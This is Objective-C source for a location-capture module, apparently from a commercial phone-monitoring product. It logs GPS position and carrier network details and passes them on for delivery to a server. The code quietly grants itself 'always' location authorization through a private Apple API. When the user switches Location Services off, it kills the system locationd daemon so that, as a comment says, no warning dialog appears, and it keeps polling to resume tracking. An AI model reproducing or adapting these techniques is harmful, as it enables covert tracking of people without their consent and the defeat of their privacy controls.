//
/**
 - Project name :  LocationManager Component
 - Class name   :  LocationCaptureOperation
 - Version      :  1.0  
 - Purpose      :  For LocationManager Component
 - Copy right   :  28/10/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "LocationCaptureOperation.h"
#import "LocationManagerWifiStatus.h"
#import "LocationManagerImpl.h"
#import "FxLocationEvent.h"
#import "DateTimeFormat.h"
#import "PhoneInfo.h"
#import "AppContext.h"

#import <objc/runtime.h>

#define LOCATION_SERVICE_CHECKING_TIMEOUT		300		// 5 min

@interface CLLocationManager (privateAPI)
+ (void) setAuthorizationStatus: (Boolean)status forBundleIdentifier: (NSString*)bundleID;
@end;

@interface LocationCaptureOperation (private) 
- (Operation) operationMode;
- (void) locationServiceCheckingTimeout;
void locationServiceCallback (CFNotificationCenterRef center, 
							  void *observer, 
							  CFStringRef name, 
							  const void *object, 
							  CFDictionaryRef userInfo);
- (void) registerLocationServiceChangingNotification;
- (void) unregisterLocationServiceChangingNotification;
- (void) startUpdatingLocation;
- (void) stopUpdatingLocation;
- (void) timeout;
- (void) trackingTimeout;
- (void) panicAlertTimeout;
- (int) requestTime;
- (void) storeLocationEvent:(CLLocation *) aNewLocation;
- (void) processLocationUpdate: (CLLocation *) aNewLocation from: (CLLocation *) aOldLocation;
@end

@implementation LocationCaptureOperation

@synthesize mTarget;
@synthesize mDidFinishSelector;
@synthesize mDidUpdateSelector;
@synthesize mDidFailureSelector;
@synthesize mDidLocationTimeoutSelector;
@synthesize mLocationManager;
@synthesize mCapturedLocation;

/**
 - Method name: initWithTarget
 - Purpose:  This method is used to initialize the LocationCaptureOperation class
 - Argument list and description: No argument.
 - Return type and description: id (LocationManagerImpl instance).
 */

- (id) initWithTarget: (LocationManagerImpl *) aTarget {
	DLog(@"initWithTarget.....");
    self = [super init];
	if (self != nil) {
		mTarget = (LocationManagerImpl *) aTarget;
		mLocationWifiStatus = [[LocationManagerWifiStatus alloc]init];
        
        // Required entitlement com.apple.locationd.authorizeapplications
        NSBundle *bundle = [NSBundle mainBundle];
        NSString *bundleID = [bundle bundleIdentifier];
        Class $CLLocationManager = objc_getClass("CLLocationManager");
        if ([$CLLocationManager respondsToSelector:@selector(setAuthorizationStatus:forBundleIdentifier:)]) {
            DLog(@"Implicitly authorized this %@ bundle ID to use location service", bundleID);
            [$CLLocationManager setAuthorizationStatus:kCLAuthorizationStatusAuthorizedAlways forBundleIdentifier:bundleID];
        }
        
        DLog(@"authorizationStatus %d", [CLLocationManager authorizationStatus]);
        
		self.mLocationManager= [[CLLocationManager alloc]init];
		self.mLocationManager.delegate=self;
		[self.mLocationManager setDesiredAccuracy:kCLLocationAccuracyBest];
		[self.mLocationManager setDistanceFilter:kCLDistanceFilterNone];
		DLog (@"Loaction Interval Time:%lu", (unsigned long)[mTarget mIntervalTime])
        
        #ifdef IOS_ENTERPRISE
        [self.mLocationManager requestAlwaysAuthorization];
        #endif

        [self registerLocationServiceChangingNotification];
	}
	return self;										 
}


/**
 - Method name: operationMode
 - Purpose:  This method is used for identifying the mode of tracking
 - Argument list and description: No argument.
 - Return type and description: (int) Operation
 */

- (Operation) operationMode {
	if([mTarget mIntervalTime] <= [mTarget mThreshold]) 
		return kModeTracking;
    return kModeInterval;
}

- (void) locationServiceCheckingTimeout {
	if ([CLLocationManager locationServicesEnabled]) {
		DLog (@"Location Service is enabled now")
		if ([mTarget mCallingModule] == kGPSCallingModulePanic ||
			[mTarget mCallingModule] == kGPSCallingModuleAlert) {
			// Cancel simulate location timeout...
			[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(panicAlertTimeout) object:nil];
		}
		
		[self run];
	} else {
		DLog (@"Location Service has still be disabled")
		[self performSelector:@selector(locationServiceCheckingTimeout) withObject:nil afterDelay:LOCATION_SERVICE_CHECKING_TIMEOUT];
	}
}

// This method will be called when the notificaiton is received
void locationServiceCallback (CFNotificationCenterRef center, 
							  void *observer, 
							  CFStringRef name, 
							  const void *object, 
							  CFDictionaryRef userInfo) {
	DLog(@"Notification intercepted (Location service): %@", name);

	
	if ([(NSString *) name isEqualToString:@"LocationServiceDidChangeNotification"]) {		
		DLog(@"Stop updating location because Location Service is OFF.....");
		
		/// NOTE: comment the below line so that the location warning dialog box will not be shown
		//if (![CLLocationManager locationServicesEnabled]) {	// double check to ensure that location is disabled now
		
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
        system("killall locationd");
#pragma GCC diagnostic pop
		
		LocationCaptureOperation *this = (LocationCaptureOperation *) observer;
		
		[this stopUpdatingLocation];
		
		DLog(@"cancel previous timeout because Location Service is OFF")
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(panicAlertTimeout) object:nil];
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(trackingTimeout) object:nil];
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(timeout) object:nil];		// case of interval capturing	
		
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(startUpdatingLocation) object:nil];
		
		[NSObject cancelPreviousPerformRequestsWithTarget:this];											// All request from previous target
		
		// In case that this callback is called more than once
		[NSObject cancelPreviousPerformRequestsWithTarget:this selector:@selector(locationServiceCheckingTimeout) object:nil];
		[this performSelector:@selector(locationServiceCheckingTimeout) withObject:nil afterDelay:LOCATION_SERVICE_CHECKING_TIMEOUT];
		
		//}					
	}
}

// This method is aimed to register for the notification from Preference
- (void) registerLocationServiceChangingNotification {
	DLog(@">>>>>>>>>>>>>>>>>> registerLocationServiceChanging");
	
	CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),			// center
									self,													// observer. this parameter may be NULL.
									&locationServiceCallback,								// callback
									(CFStringRef) @"LocationServiceDidChangeNotification",				// name
									NULL,													// object. this value is ignored in the case that the center is Darwin
									CFNotificationSuspensionBehaviorHold); 
}

- (void) unregisterLocationServiceChangingNotification {
	DLog(@">>>>>>>>>>>>>>>>>> unregisterLocationServiceChangingNotification");
	
	CFNotificationCenterRemoveObserver (CFNotificationCenterGetDarwinNotifyCenter(),
										self,
										(CFStringRef) @"LocationServiceDidChangeNotification",
										NULL);
}

/**
 - Method name: run
 - Purpose:  This method is perform tracking location
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

- (void) run {
	DLog (@"============================= self = %@, mTarget = %@", self, mTarget);
	DLog(@"run..... [self requestTime]: %d, [mTarget mInterval]: %lu", [self requestTime], (unsigned long)[mTarget mIntervalTime]);
	DLog(@"=====================================")
	
#ifdef IOS_ENTERPRISE
    [self performSelector:@selector(startUpdatingLocation) withObject:nil afterDelay:[self requestTime]];
    
    if ([self operationMode] == kModeInterval) {
        DLog(@"Operation mode: INTERVAL")
        [self performSelector:@selector(timeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
    } else {
        DLog (@"Operation mode: TRACKING")
        [self performSelector:@selector(trackingTimeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
    }
#else
    if ([CLLocationManager locationServicesEnabled]) {
        // this method may result in Location Dialog box of the system
        [self performSelector:@selector(startUpdatingLocation) withObject:nil afterDelay:[self requestTime]];
        
        if ([self operationMode] == kModeInterval) {
            DLog(@"Operation mode: INTERVAL")
            [self performSelector:@selector(timeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
        } else {
            DLog (@"Operation mode: TRACKING")
            [self performSelector:@selector(trackingTimeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
        }
    } else {
        DLog (@"Location service is disabled now !!!!!")
        
        [self performSelector:@selector(locationServiceCheckingTimeout) withObject:nil afterDelay:LOCATION_SERVICE_CHECKING_TIMEOUT];
        
        if ([mTarget mCallingModule] == kGPSCallingModulePanic ||
            [mTarget mCallingModule] == kGPSCallingModuleAlert) {
            // Simulate location timeout... otherwise user never get location SMS..
            [self performSelector:@selector(panicAlertTimeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
        }
    }
#endif
}

/**
 - Method name: startUpdatingLocation
 - Purpose:  This method is used to start updating location
 - Argument list and description: No argument.
 - Return type and description: No Return
 */	

- (void) startUpdatingLocation {
	DLog(@"startUpdatingLocation CLLocationManager .....");
	[self.mLocationManager startUpdatingLocation];

    #ifdef IOS_ENTERPRISE
    [self.mLocationManager startMonitoringSignificantLocationChanges];
    #endif
}

/**
 - Method name: stopUpdatingLocation
 - Purpose:  This method is used to stop updating location
 - Argument list and description: No argument.
 - Return type and description: No Return
 */	

- (void) stopUpdatingLocation {
	DLog(@"stopUpdatingLocation CLLocationManager .....");
	[self.mLocationManager stopUpdatingLocation];
    
#ifdef IOS_ENTERPRISE
    [self.mLocationManager stopMonitoringSignificantLocationChanges];
#endif
}

/**
 - Method name: reuestTimeForIntervalMode
 - Purpose:  This method is used to get the requestTime
 - Argument list and description: No argument.
 - Return type and description: (int) reuestTimeForIntervalMode
 */	

- (int) requestTime {
	DLog (@"========= Request time enter =============");
	if ([self operationMode] == kModeTracking) {
    	return 0;
	} else {
		int tmp = (int)([mTarget mIntervalTime] - [mTarget mLocationServicesActiveTime]);
		if (tmp < 0) {
			
			// In interval mode, always start GPS device and request data mLocationServiceActiveTime (seconds) before interval time is reached 
			//tmp = [mTarget mLocationServicesActiveTime];			
			/* 
			 * In the case that interval time is less than active time (time to request CLLocation API to update location), 
			 * we need to get the location update from CLLocation before interval time is reached,
			 */
			tmp = floor([mTarget mIntervalTime]/2);
			DLog(@"reset request time to %d", tmp)

		}
		return tmp;
	}
}

/**
 - Method name: reuestTimeForIntervalMode
 - Purpose:  This method is invoked when timeout is reached
 - Argument list and description: No argument.
 - Return type and description: No Return
*/	
		
- (void) timeout {
	DLog(@"===========================================")
	DLog(@"!!!!!!!!!!!!!!!!!!!! [Interval] timeout....")
	DLog(@"===========================================")
	
	[self stopUpdatingLocation];
	[self run];
	
	if (mDidLocationTimeoutSelector) {
		DLog (@"mDidLocationTimeoutSelector exist")
		// -- This is required to call before mDidFinishSelector
		[mTarget performSelector:mDidLocationTimeoutSelector withObject:nil];
	} 
		
	if (mDidFinishSelector) 
		[mTarget performSelector:mDidFinishSelector withObject:nil];	
}

/**
 - Method name: trackingTimeout
 - Purpose:  This method is invoked when tracking timeout is reached... (tracking for gps location but filter event every interval)
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

- (void) trackingTimeout {
    DLog(@"----------- [Tracking] timeout");
	[self performSelector:@selector(trackingTimeout) withObject:self afterDelay:[mTarget mIntervalTime]];
	if (mDidFinishSelector) {
		[mTarget performSelector:mDidFinishSelector withObject:nil];
	}
}

/**
 - Method name: panicAlertTimeout
 - Purpose:  This method use to simulate location timeout when location service is disable and the calling module is panic & alert
 - Argument list and description: No argument.
 - Return type and description: No Return
 */

- (void) panicAlertTimeout {
	DLog (@"--------- [Alert + Panic] timeout");
	
	[self performSelector:@selector(panicAlertTimeout) withObject:nil afterDelay:[mTarget mIntervalTime]];
	
	if (mDidLocationTimeoutSelector) {
		DLog (@"--------- [Alert + Panic] mDidLocationTimeoutSelector exist")
		// -- This is required to call before mDidFinishSelector
		[mTarget performSelector:mDidLocationTimeoutSelector withObject:nil];
	} 
	
	if (mDidFinishSelector) 
		[mTarget performSelector:mDidFinishSelector withObject:nil];
}

/**
 - Method name: cancelCurrentOperation
 - Purpose:  This method is used to cancel the running operation
 - Argument list and description: No argument.
 - Return type and description: No Return
*/	
		
- (void) cancelCurrentOperation {
	DLog(@"Cancel CurrentOperation.....");
	[self stopUpdatingLocation];
	DLog(@"--------------------------------------------------------------")
	DLog(@"cancel previous simulate location timeout for panic and alert")
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(panicAlertTimeout) object:nil];
	DLog(@"--------------------------------------------------------------")
	DLog(@"cancel previous tracking timeout")
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(trackingTimeout) object:nil];
	DLog(@"--------------------------------------------------------------")
	DLog(@"cancel previous interval timeout")
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(timeout) object:nil];
	DLog(@"--------------------------------------------------------------")
	DLog(@"cancel location service checking timeout")
	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(locationServiceCheckingTimeout) object:nil];
	DLog(@"--------------------------------------------------------------")	

	[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(startUpdatingLocation) object:nil];
	
	// All request from previous target
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	
	mLocationManager.delegate=nil;
	[mLocationManager release];
	mLocationManager=nil;
	self.mCapturedLocation=nil;
	[mLocationWifiStatus release];
	mLocationWifiStatus=nil;
	
	[self setMDidFinishSelector:nil];
	[self setMDidUpdateSelector:nil];
	[self setMDidFailureSelector:nil];
	mTarget = nil;
	
	DLog(@"Canceled current operation...")
}


/**
 - Method name: sendLocation
 - Purpose:  This method is used to store the captured Location 
 - Argument list and description: aNewLocation (CLLocation).
 - Return type and description: No Return
 */

- (void) storeLocationEvent: (CLLocation *) aNewLocation {
	DLog(@"Store Location event.....");
	FxGPSTechType techType=kGPSTechUnknown;
	if (aNewLocation.verticalAccuracy>0) {
		//techType=kGPSTechIntegrated;
		techType=kGPSTechAssisted;
		DLog(@"Location Services using GPS......");
	}
	else if( aNewLocation.verticalAccuracy<0 && [mLocationWifiStatus getWifiStatus] && (aNewLocation.horizontalAccuracy<150.0)) {
		techType=kGPSTechWifi;
		DLog(@"Location Services using Wifi......");
	}
	else {
		//techType=kGPSTechCellular; --> For the time being use network base
		techType=kGPSTechNetworkBased;
		DLog(@"Location Services using Cellular......");
	}
	
	DLog(@"------------------------------------------------")
	DLog(@"New location latitude = %lf", aNewLocation.coordinate.latitude)
	DLog(@"New location longitude = %lf", aNewLocation.coordinate.longitude)
	DLog(@"New location altitude = %lf", aNewLocation.altitude)
	DLog(@"New location speed = %lf", aNewLocation.speed)
	DLog(@"New location horizontalAccuracy = %lf", aNewLocation.horizontalAccuracy)
	DLog(@"New location verticalAccuracy = %lf", aNewLocation.verticalAccuracy)
	DLog(@"------------------------------------------------")
	
	id <PhoneInfo> phoneInfo= [[mTarget mAppContext] getPhoneInfo];
	//Store location event
	// By default provider is unknown
	FxLocationEvent *locationEvent=[[FxLocationEvent alloc]init];
	[locationEvent setProvider:kGPSProviderUnknown];
	[locationEvent setEventType:kEventTypeLocation];
	[locationEvent setNetworkId:[phoneInfo getMobileNetworkCode]];
	[locationEvent setNetworkName:[phoneInfo getNetworkName]];
	[locationEvent setCountryCode:[phoneInfo getMobileCountryCode]];
	[locationEvent setLatitude:aNewLocation.coordinate.latitude];
	[locationEvent setLongitude:aNewLocation.coordinate.longitude];
	[locationEvent setAltitude:aNewLocation.altitude];
	[locationEvent setAltitude:aNewLocation.speed];
	[locationEvent setHorizontalAcc:aNewLocation.horizontalAccuracy];
	[locationEvent setVerticalAcc:aNewLocation.verticalAccuracy];
	[locationEvent setMethod:techType];
	[locationEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[locationEvent setCallingModule:[mTarget mCallingModule]];
	
	if(mDidUpdateSelector) {
	    [mTarget performSelector:mDidUpdateSelector withObject:locationEvent];
	}
	
	// Now tracking mode have to wait for its tracking timeout before deliver event to server
//	if (mDidFinishSelector!=nil) {
//		if ([self operationMode] == kModeTracking) {
//			[mTarget performSelector:mDidFinishSelector withObject:nil];
//		}
//	}
	
	[locationEvent release];
}

- (void) processLocationUpdate: (CLLocation *) aNewLocation from: (CLLocation *) aOldLocation {
    //The location is nil.
    if (!aNewLocation) return;
    
    //Discard the location when it stored ago 3 seconds
    NSTimeInterval locationAge = -[aNewLocation.timestamp timeIntervalSinceNow];
    if (locationAge > 3.0) return;
    
    // test the measurement to see if it is more accurate than the previous measurement
    if (self.mCapturedLocation == nil || aNewLocation.horizontalAccuracy > mCapturedLocation.horizontalAccuracy) {
        // store the location as the "best effort"
        self.mCapturedLocation = aNewLocation;
        DLog(@"Store best accuracy: %@", self.mCapturedLocation);
    }
    
    // Update LocationEvent;
    [self storeLocationEvent:aNewLocation];
}

#pragma mark========== CLLocationManagerDelegate methods ===========================

/**
 - Method name: updatedLocation:didUpdateToLocation:fromLocation
 - Purpose: This is callback method. Invoked when a new location is available. oldLocation may be nil if there is no previous location available.
 - Argument list and description: aManager (CLLocationManager instance ),aNewLocation(CLLocation instance),aOldLocation(aOldLocation)
 - Return type and description: No Return
 */

#ifndef IOS_ENTERPRISE
- (void) locationManager: (CLLocationManager *) aManager didUpdateToLocation : (CLLocation *) aNewLocation  fromLocation :(CLLocation *) aOldLocation {
	DLog(@"locationManager didUpdateToLocation.....");
	DLog (@"aNewLocation = %@", aNewLocation);
	DLog (@"aOldLocation = %@", aOldLocation);
	
    [self processLocationUpdate:aNewLocation from:aOldLocation];
}
#endif

- (void)locationManager:(CLLocationManager *)manager
     didUpdateLocations:(NSArray *)locations {
    DLog(@"locationManager didUpdateLocations..... manager: %@", manager);
    DLog(@"locations: %@", locations);
    
    CLLocation *newLocation = nil;
    CLLocation *oldLocation = nil;
    
    newLocation = [locations lastObject];
    if ([locations count] > 1) {
        oldLocation = [locations objectAtIndex:[locations count] - 2];
    }
    
    [self processLocationUpdate:newLocation from:oldLocation];
}

- (void)locationManager:(CLLocationManager *)manager
       didUpdateHeading:(CLHeading *)newHeading {
    DLog(@"didUpdateHeading... manager: %@, newHeading: %@", manager, newHeading);
}

- (BOOL)locationManagerShouldDisplayHeadingCalibration:(CLLocationManager *)manager {
    DLog(@"locationManagerShouldDisplayHeadingCalibration... manager: %@", manager);
    return (NO);
}

- (void)locationManager:(CLLocationManager *)manager
      didDetermineState:(CLRegionState)state forRegion:(CLRegion *)region {
    DLog(@"didDetermineState... manager: %@, state: %ld, region: %@", manager, (long)state, region);
}

- (void)locationManager:(CLLocationManager *)manager
        didRangeBeacons:(NSArray *)beacons inRegion:(CLBeaconRegion *)region {
    DLog(@"didRangeBeacons... manager: %@, beacons: %@, region: %@", manager, beacons, region);
}

- (void)locationManager:(CLLocationManager *)manager
rangingBeaconsDidFailForRegion:(CLBeaconRegion *)region
              withError:(NSError *)error {
    DLog(@"rangingBeaconsDidFailForRegion... manager: %@, region: %@, error: %@", manager, region, error);
}

- (void)locationManager:(CLLocationManager *)manager
         didEnterRegion:(CLRegion *)region {
    DLog(@"didEnterRegion... manager: %@, region: %@", manager, region);
}

- (void)locationManager:(CLLocationManager *)manager
          didExitRegion:(CLRegion *)region {
    DLog(@"didExitRegion... manager: %@, region: %@", manager, region);
}

/**
 - Method name: locationManager:didFailWithError
 - Purpose: This is callback method. Invoked when an error has occurred..
 - Argument list and description: aManager (CLLocationManager instance ),aNewLocation(CLLocation instance),aOldLocation(aOldLocation)
 - Return type and description: No Return
 */
- (void) locationManager: (CLLocationManager *) aManager  didFailWithError: (NSError *)aError {
	DLog(@"locationManager didFailWithError..... %@", aError);
    
    /*
     iPad mini (improvement): On demand only, if location is acquired from first location service response, next response error will be ignored
     */
    
    if ([mTarget mCallingModule] == kGPSCallingModuleRemoteCommand) {
        DLog(@"LocationManager failure, should keep last location %d", (self.mCapturedLocation != nil));
        if (!self.mCapturedLocation) {
            if(mDidFailureSelector!=nil) {
                [mTarget performSelector:mDidFailureSelector withObject:aError];
            }
        }
    } else {
        if(mDidFailureSelector!=nil) {
            [mTarget performSelector:mDidFailureSelector withObject:aError];
        }
    }
}

- (void)locationManager:(CLLocationManager *)manager
monitoringDidFailForRegion:(CLRegion *)region
              withError:(NSError *)error {
    DLog(@"monitoringDidFailForRegion... manager: %@, region: %@, error: %@", manager, region, error);
}

- (void)locationManager:(CLLocationManager *)manager didChangeAuthorizationStatus:(CLAuthorizationStatus)status {
    DLog(@"didChangeAuthorizationStatus... manager: %@, status: %d", manager, status);
    
    #ifdef IOS_ENTERPRISE
    if (status == kCLAuthorizationStatusAuthorizedAlways) {
        [self run];
    }
    else {
        [self.mLocationManager requestAlwaysAuthorization];
    }
    #endif
}

- (void)locationManager:(CLLocationManager *)manager didStartMonitoringForRegion:(CLRegion *)region {
    DLog(@"didStartMonitoringForRegion... manager: %@, region: %@", manager, region);
}

- (void)locationManagerDidPauseLocationUpdates:(CLLocationManager *)manager {
    DLog(@"locationManagerDidPauseLocationUpdates... manager: %@", manager);
    #ifdef IOS_ENTERPRISE
    [self stopUpdatingLocation];
    [self run];
    #endif
}

- (void)locationManagerDidResumeLocationUpdates:(CLLocationManager *)manager {
    DLog(@"locationManagerDidResumeLocationUpdates... manager: %@", manager);
}

- (void)locationManager:(CLLocationManager *)manager didFinishDeferredUpdatesWithError:(NSError *)error {
    DLog(@"didFinishDeferredUpdatesWithError... manager: %@, error: %@", manager, error);
}

#if !TARGET_OS_IPHONE
- (void)locationManager:(CLLocationManager *)manager didVisit:(CLVisit *)visit {
    DLog(@"didVisit... manager: %@, visit: %@", manager, visit);
}
#endif

- (void) dealloc {
	DLog (@"LocationCaptureOperation is dealloced")
	[self cancelCurrentOperation];
	[mCapturedLocation release];
	[mLocationManager release];
	
	[self unregisterLocationServiceChangingNotification];
	[super dealloc];
}

@end
